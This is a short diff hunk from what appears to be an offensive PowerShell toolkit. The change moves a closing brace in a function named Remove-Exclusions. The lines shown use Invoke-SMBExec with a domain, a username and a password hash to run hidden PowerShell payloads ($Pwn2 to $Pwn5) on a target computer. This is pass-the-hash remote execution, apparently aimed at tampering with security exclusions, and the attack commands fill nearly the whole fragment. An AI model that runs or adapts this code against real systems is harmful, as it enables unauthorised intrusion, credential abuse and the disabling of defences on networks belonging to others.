@@ -165,7 +165,7 @@ function Remove-Exclusions {
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" } ; $user = $null
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" ; $user = $null }
 
         '3' {
         if($option) { $computer='localhost' } else {
